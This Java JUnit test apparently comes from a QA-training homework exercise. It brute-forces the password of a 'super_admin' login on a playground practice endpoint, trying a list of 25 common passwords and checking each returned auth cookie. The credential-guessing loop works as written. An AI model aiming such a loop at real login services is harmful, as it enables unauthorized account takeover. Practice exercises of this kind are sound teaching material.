import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class PasswordTest {

    @Test
    public void TestPassword() {
        String baseUrl = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String verifyCookieUrl = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

        List<String> passwords = List.of(
                "123456", "123456789", "qwerty", "password", "1234567",
                "12345678", "12345", "iloveyou", "111111", "123123",
                "abc123", "qwerty123", "1q2w3e4r", "admin", "qwertyuiop", "654321",
                "555555", "lovely", "7777777", "welcome", "888888",
                "princess", "dragon", "password1", "123qwe"
        );

        Map<String, String> data = new HashMap<>();
        for (String password : passwords) {
            data.put("login", "super_admin");
            data.put("password", password);

            Response response = RestAssured
                    .given()
                    .body(data)
                    .when()
                    .post(baseUrl)
                    .andReturn();

            String responseCookie = response.getCookie("auth_cookie");

            Map<String, String> cookies = new HashMap<>();
            if (responseCookie != null) {
                cookies.put("auth_cookie", responseCookie);
            }

            Response responseForCheck = RestAssured
                    .given()
                    .body(data)
                    .cookies(cookies)
                    .when()
                    .post(verifyCookieUrl)
                    .andReturn();

            String answer = responseForCheck.asString();

            if (answer.equals("You are authorized")) {
                System.out.println(answer + " with password - " + password);
                break;
            }
        }
    }

}
